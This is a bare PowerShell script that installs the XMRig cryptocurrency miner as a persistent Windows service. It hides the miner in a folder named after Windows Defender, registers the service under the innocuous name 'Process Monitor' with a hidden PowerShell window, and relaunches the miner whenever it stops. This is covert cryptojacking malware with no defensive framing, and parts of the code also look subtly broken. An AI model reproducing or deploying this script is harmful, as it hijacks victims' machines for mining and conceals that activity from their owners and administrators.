
$confirm = "C:\ProgramData\Microsoft\Windows Defender"
$exePath = "$confirm\xmrig-6.22.2\xmrig.exe"
$checkInterval = 7200

if (-not ([System.Management.Automation.PSTypeName]'ServiceWrapper').Type) {
    Add-Type -TypeDefinition @"
    using System;
    using System.ServiceProcess;
    
    public class ServiceWrapper : ServiceBase {
        public static void Main() {
            ServiceBase.Run(new ServiceWrapper());
        }
        
        protected override void OnStart(string[] args) {
            StartMonitoring();
        }
        
        protected override void OnStop() {}
        
        private async void StartMonitoring() {
            while (true) {
                var process = System.Diagnostics.Process.GetProcessesByName("xmrig.exe");
                if (process.Length == 0) {
                    System.Diagnostics.Process.Start("$exePath");
                }
                await System.Threading.Tasks.Task.Delay($checkInterval * 1000);
            }
        }
    }
"@ -ReferencedAssemblies "System.ServiceProcess"
}

if ($MyInvocation.MyCommand.CommandType -eq "Script") {
    if ($args[0] -eq "-install") {
        New-Service -Name "ProcessMonitorService" `
            -BinaryPathName "powershell.exe -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`"" `
            -DisplayName "Process Monitor" `
            -StartupType Automatic
        Start-Service ProcessMonitorService
    }
    elseif ($args[0] -eq "-uninstall") {
        Stop-Service ProcessMonitorService -Force
        Remove-Service ProcessMonitorService
    }
    else {
        [ServiceWrapper]::Main()
    }
}